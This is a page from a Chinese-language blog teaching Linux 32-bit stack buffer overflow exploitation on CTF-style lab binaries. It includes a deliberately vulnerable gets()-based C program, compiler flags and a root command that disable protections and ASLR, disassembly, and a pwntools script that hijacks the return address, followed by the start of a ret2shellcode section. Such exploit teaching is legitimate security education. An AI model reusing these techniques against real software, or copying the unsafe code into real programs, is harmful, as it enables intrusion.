<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-center-atom.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/hackerrank.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerrank.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerrank.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="linux,pwn,æ ˆæº¢å‡º,">





  <link rel="alternate" href="/atom.xml" title="æ··å…ƒéœ¹é›³æ‰‹" type="application/atom+xml">






<meta name="description" content="ä¹‹å‰ä»‹ç»äº†Windows x86å¹³å°ä¸‹æ ˆæº¢å‡ºæ¼æ´çš„å¼€æ”¾ä¸åˆ©ç”¨ï¼Œé‰´äºCTFåŸºæœ¬éƒ½æ˜¯Linuxï¼Œè¿˜æœ‰å®é™…å¼€å‘ç¯å¢ƒï¼Œå¾ˆå¤šæ™ºèƒ½è®¾å¤‡çš„ç³»ç»Ÿéƒ½æ˜¯åŸºäºLinuxï¼Œæ‰€ä»¥ä»å¾ˆç°å®çš„éœ€æ±‚å‡ºå‘ï¼Œä¸€å®šè¦å­¦ä¹ å­¦ä¹ Linuxä¸‹æ¼æ´çš„åˆ†æã€‚">
<meta name="keywords" content="linux,pwn,æ ˆæº¢å‡º">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux Pwn-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨">
<meta property="og:url" content="https://cool-y.github.io/2019/07/16/linux-pwn-32/index.html">
<meta property="og:site_name" content="æ··å…ƒéœ¹é›³æ‰‹">
<meta property="og:description" content="ä¹‹å‰ä»‹ç»äº†Windows x86å¹³å°ä¸‹æ ˆæº¢å‡ºæ¼æ´çš„å¼€æ”¾ä¸åˆ©ç”¨ï¼Œé‰´äºCTFåŸºæœ¬éƒ½æ˜¯Linuxï¼Œè¿˜æœ‰å®é™…å¼€å‘ç¯å¢ƒï¼Œå¾ˆå¤šæ™ºèƒ½è®¾å¤‡çš„ç³»ç»Ÿéƒ½æ˜¯åŸºäºLinuxï¼Œæ‰€ä»¥ä»å¾ˆç°å®çš„éœ€æ±‚å‡ºå‘ï¼Œä¸€å®šè¦å­¦ä¹ å­¦ä¹ Linuxä¸‹æ¼æ´çš„åˆ†æã€‚">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1563267241/pwn/4a7227aa9f00bd2fd45d363da4cf25c6fd425638.jpg">
<meta property="og:updated_time" content="2021-04-10T13:43:18.149Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux Pwn-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨">
<meta name="twitter:description" content="ä¹‹å‰ä»‹ç»äº†Windows x86å¹³å°ä¸‹æ ˆæº¢å‡ºæ¼æ´çš„å¼€æ”¾ä¸åˆ©ç”¨ï¼Œé‰´äºCTFåŸºæœ¬éƒ½æ˜¯Linuxï¼Œè¿˜æœ‰å®é™…å¼€å‘ç¯å¢ƒï¼Œå¾ˆå¤šæ™ºèƒ½è®¾å¤‡çš„ç³»ç»Ÿéƒ½æ˜¯åŸºäºLinuxï¼Œæ‰€ä»¥ä»å¾ˆç°å®çš„éœ€æ±‚å‡ºå‘ï¼Œä¸€å®šè¦å­¦ä¹ å­¦ä¹ Linuxä¸‹æ¼æ´çš„åˆ†æã€‚">
<meta name="twitter:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1563267241/pwn/4a7227aa9f00bd2fd45d363da4cf25c6fd425638.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://cool-y.github.io/2019/07/16/linux-pwn-32/">





  <title>Linux Pwn-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨ | æ··å…ƒéœ¹é›³æ‰‹</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">æ··å…ƒéœ¹é›³æ‰‹</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Battleâš”ï¸ 2 the worldğŸŒ</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      
        
        <li class="menu-item menu-item-bookmarks">
          <a href="/bookmarks/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-map"></i> <br>
            
            ä¹¦ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-album">
          <a href="/album/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>
            
            ç›¸ç°¿
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/07/16/linux-pwn-32/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Cool-Y">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="æ··å…ƒéœ¹é›³æ‰‹">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Linux Pwn-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-07-16T17:11:42+08:00">
                2019-07-16
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn/" itemprop="url" rel="index">
                    <span itemprop="name">Pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2019/07/16/linux-pwn-32/" class="leancloud_visitors" data-flag-title="Linux Pwn-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  6k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  28 åˆ†é’Ÿ
                </span>
              
            </div>
          

          
              <div class="post-description">
                  ä¹‹å‰ä»‹ç»äº†Windows x86å¹³å°ä¸‹æ ˆæº¢å‡ºæ¼æ´çš„å¼€æ”¾ä¸åˆ©ç”¨ï¼Œé‰´äºCTFåŸºæœ¬éƒ½æ˜¯Linuxï¼Œè¿˜æœ‰å®é™…å¼€å‘ç¯å¢ƒï¼Œå¾ˆå¤šæ™ºèƒ½è®¾å¤‡çš„ç³»ç»Ÿéƒ½æ˜¯åŸºäºLinuxï¼Œæ‰€ä»¥ä»å¾ˆç°å®çš„éœ€æ±‚å‡ºå‘ï¼Œä¸€å®šè¦å­¦ä¹ å­¦ä¹ Linuxä¸‹æ¼æ´çš„åˆ†æã€‚
              </div>
          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><strong>refï¼š</strong></p>
<blockquote>
<p>CTF-WIKIï¼š<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/</a><br>è’¸ç±³å¤§ä½¬çš„ä¸€æ­¥ä¸€æ­¥å­¦rop <a href="http://www.anquan.us/static/drops/tips-6597.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-6597.html</a><br><a href="https://bbs.pediy.com/thread-221734.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-221734.htm</a></p>
</blockquote>
<p><strong>å·¥å…·ï¼š</strong></p>
<blockquote>
<p>objdumpã€lddã€ROPgadgetã€readelfã€<a href="https://ctf-wiki.github.io/ctf-tools/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-tools/</a><br><a href="https://github.com/ctf-wiki/ctf-challenges" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges</a></p>
</blockquote>
<h1 id="0x00-Control-Flow-hijack"><a href="#0x00-Control-Flow-hijack" class="headerlink" title="0x00 Control Flow hijack"></a>0x00 Control Flow hijack</h1><p>å’ŒWindowsä¸€æ ·ï¼Œæ ˆæº¢å‡ºçš„æ ¹æœ¬åŸå› åœ¨äºå½“å‰è®¡ç®—æœºçš„ä½“ç³»ç»“æ„æ²¡æœ‰åŒºåˆ†ä»£ç æ®µå’Œæ•°æ®æ®µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹æ•°æ®æ®µçš„å†…å®¹ï¼ˆè¿”å›åœ°å€ï¼‰ï¼Œæ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä»è€Œè¾¾åˆ°ç¨‹åºæµåŠ«æŒçš„æ•ˆæœã€‚<br>æ”¹å˜è®¡ç®—æœºä½“ç³»æ¥è§„é¿æ¼æ´ç›®å‰æ˜¯ä¸å¯èƒ½çš„ï¼Œé˜²å¾¡è€…ä¸ºäº†åº”å¯¹è¿™ç§æ”»å‡»ï¼Œæå‡ºäº†å„ç§å¢å¤§æ”»å‡»éš¾åº¦çš„æªæ–½ï¼ˆæ²¡æœ‰ç»å¯¹å®‰å…¨çš„ç³»ç»Ÿï¼‰ï¼Œæœ€å¸¸è§çš„æœ‰ï¼šDEPå †æ ˆä¸å¯æ‰§è¡Œã€ASLRå†…å­˜åœ°å€éšæœºåŒ–ã€GS/Canaryæ ˆä¿æŠ¤ç­‰ã€‚<br>æˆ‘ä»¬ä»æœ€ç®€å•çš„å…¥æ‰‹ï¼Œä¸å¼€å¯ä»»ä½•é˜²æŠ¤ï¼Œå…ˆäº†è§£æ ˆæº¢å‡ºçš„åŸºæœ¬æ“ä½œï¼Œç„¶åé€æ­¥å¢åŠ é˜²å¾¡æªæ–½ã€‚</p>
<h2 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h2><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ¼æ´ç¨‹åº<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å½“æˆ‘ä»¬çœ‹åˆ°getsæ—¶å°±åº”è¯¥çŸ¥é“å¦‚ä½•å…¥æ‰‹äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„å‡½æ•°ï¼Œæ— æ¡ä»¶çš„æ¥å—ä»»æ„å¤§çš„å­—ç¬¦ä¸²ã€‚<br>å†å²ä¸Šï¼Œè«é‡Œæ–¯è •è™«ç¬¬ä¸€ç§è •è™«ç—…æ¯’å°±åˆ©ç”¨äº† gets è¿™ä¸ªå±é™©å‡½æ•°å®ç°äº†æ ˆæº¢å‡ºã€‚<br>å…ˆè¿›è¡Œç¼–è¯‘ï¼Œå…³é—­é˜²å¾¡æªæ–½ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -no-pie -fno-stack-protector -z execstack stack1.c -o stack1</span><br><span class="line">stack1.c: In function â€˜vulnerableâ€™:</span><br><span class="line">stack1.c:6:3: warning: implicit declaration of function â€˜getsâ€™; did you mean â€˜fgetsâ€™? [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^~~~</span><br><span class="line">   fgets</span><br><span class="line">/tmp/ccUuPrSy.o: In function `vulnerable&apos;:</span><br><span class="line">stack1.c:(.text+0x45): warning: the `gets&apos; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure></p>
<p>ç¼–è¯‘å™¨éƒ½ä¼šæç¤ºä½ ï¼Œgetsä¸è¦å†ç”¨äº†ã€‚-fno-stack-protector å’Œ-z execstackåˆ†ä¾¿ä¼šå…³æ‰æ ˆä¿æŠ¤çš„DEP.-no-PIEå…³é—­ PIEï¼ˆPosition Independent Executableï¼‰ï¼Œé¿å…åŠ è½½åŸºå€è¢«æ‰“ä¹±ã€‚æ¥ä¸‹æ¥å…³é—­æ•´ä¸ªlinuxç³»ç»Ÿçš„ASLRä¿æŠ¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line">Password:</span><br><span class="line">root@ubuntu:/home/han/ck/pwn/linux/stack_demo# echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@ubuntu:/home/han/ck/pwn/linux/stack_demo# exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
<h2 id="è®¡ç®—æº¢å‡ºç‚¹çš„ä½ç½®"><a href="#è®¡ç®—æº¢å‡ºç‚¹çš„ä½ç½®" class="headerlink" title="è®¡ç®—æº¢å‡ºç‚¹çš„ä½ç½®"></a>è®¡ç®—æº¢å‡ºç‚¹çš„ä½ç½®</h2><p>ä»€ä¹ˆæ˜¯æº¢å‡ºç‚¹çš„ä½ç½®ï¼šä»ç¼“å†²åŒºåˆ°è¦†ç›–è¿”å›åœ°å€æ‰€éœ€è¦çš„å­—èŠ‚æ•°<br>æˆ‘ä»¬åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·pattern_createå’Œpattern_offsetæ¥è®¡ç®—ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆæ‰‹åŠ¨è®¡ç®—ï¼š<br>æŠŠstack1æ‹–å…¥IDAè¿›è¡Œåæ±‡ç¼–åˆ†æï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int vulnerable()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+4h] [bp-14h]@1</span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  return puts(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>åœ¨ä¼ªä»£ç çª—å£ï¼Œæˆ‘ä»¬å¯çœ‹åˆ°å˜é‡så’Œbpçš„è·ç¦»ä¸º14hï¼Œå†åŠ ä¸Šold bpçš„4å­—èŠ‚ï¼Œåˆ°retçš„è·ç¦»å°±æ˜¯18hã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure></p>
<h2 id="åŠ«æŒretçš„åœ°å€"><a href="#åŠ«æŒretçš„åœ°å€" class="headerlink" title="åŠ«æŒretçš„åœ°å€"></a>åŠ«æŒretçš„åœ°å€</h2><p>è¿™é‡Œæˆ‘ä»¬æƒ³è®©ç¨‹åºè·³è½¬åˆ°success()ï¼Œä»IDAç›´æ¥å¯ä»¥è·å–0x08048456<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:08048456 success         proc near</span><br><span class="line">.text:08048456</span><br><span class="line">.text:08048456 var_4           = dword ptr -4</span><br><span class="line">.text:08048456</span><br><span class="line">.text:08048456                 push    ebp</span><br><span class="line">.text:08048457                 mov     ebp, esp</span><br><span class="line">.text:08048459                 push    ebx</span><br><span class="line">.text:0804845A                 sub     esp, 4</span><br><span class="line">.text:0804845D                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048462                 add     eax, 1B9Eh</span><br><span class="line">.text:08048467                 sub     esp, 0Ch</span><br><span class="line">.text:0804846A                 lea     edx, (aYouHavaAlready - 804A000h)[eax] ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08048470                 push    edx             ; s</span><br><span class="line">.text:08048471                 mov     ebx, eax</span><br><span class="line">.text:08048473                 call    _puts</span><br><span class="line">.text:08048478                 add     esp, 10h</span><br><span class="line">.text:0804847B                 nop</span><br><span class="line">.text:0804847C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:0804847F                 leave</span><br><span class="line">.text:08048480                 retn</span><br><span class="line">.text:08048480 success         endp</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²ä¸ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18*&apos;a&apos;+success_addr</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ ·å°±ä¼šå°†retaddrè¦†ç›–å·å³¨å“¦success_addr,æ­¤æ—¶æ ˆç»“æ„ä¸ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x0804843B   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       aaaa      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure></p>
<h2 id="pwnæµ‹è¯•"><a href="#pwnæµ‹è¯•" class="headerlink" title="pwnæµ‹è¯•"></a>pwnæµ‹è¯•</h2><p>ä½¿ç”¨pwntoolsï¼Œæ€ä¹ˆä½¿ç”¨ï¼Œä»¥å…·ä½“çš„expæ¥ä»‹ç»ï¼Œæ¯”å¦‚stack1çš„expå¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./stack1&apos;)</span><br><span class="line">ret_addr = 0x08048456</span><br><span class="line">offset = 0x18</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos; * offset + p32(ret_addr)</span><br><span class="line">print(ret_addr,p32(ret_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<blockquote>
<ol>
<li>è¿æ¥<br>æœ¬åœ°process(),è¿œç¨‹remote()</li>
<li>æ•°æ®å¤„ç†<br>p32ã€p64æ˜¯æ‰“åŒ…ï¼ˆè½¬æ¢æˆäºŒè¿›åˆ¶ï¼‰ï¼Œu32ã€u64æ˜¯è§£åŒ…</li>
<li>IOæ¨¡å—<br>send(data) : å‘é€æ•°æ®<br>sendline(data) : å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æœ«å°¾åŠ \n<br>interactive() : ä¸shelläº¤äº’</li>
</ol>
</blockquote>
<p>æ‰§è¡Œexpï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python stack1.py</span><br><span class="line">[+] Starting local process &apos;./stack1&apos;: pid 8328</span><br><span class="line">(134513750, &apos;V\x84\x04\x08&apos;)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAV\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="0X01-ret2shellcode"><a href="#0X01-ret2shellcode" class="headerlink" title="0X01 ret2shellcode"></a>0X01 ret2shellcode</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ret2shellcodeï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcode ä»£ç ã€‚shellcode æŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„ shellã€‚ä¸€èˆ¬æ¥è¯´ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚è¿™å…¶å®æ˜¯å¦å¤–ä¸€ç§å…¸å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·±å»å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚</p>
<p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™(NX disabled)ã€‚</p>
<h2 id="æ£€æŸ¥ä¿æŠ¤æƒ…å†µ"><a href="#æ£€æŸ¥ä¿æŠ¤æƒ…å†µ" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æƒ…å†µ"></a>æ£€æŸ¥ä¿æŠ¤æƒ…å†µ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2shellcode</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/re2shellcode/ret2shellcode&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºæºç¨‹åºå‡ ä¹æ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œæ®µã€‚</p>
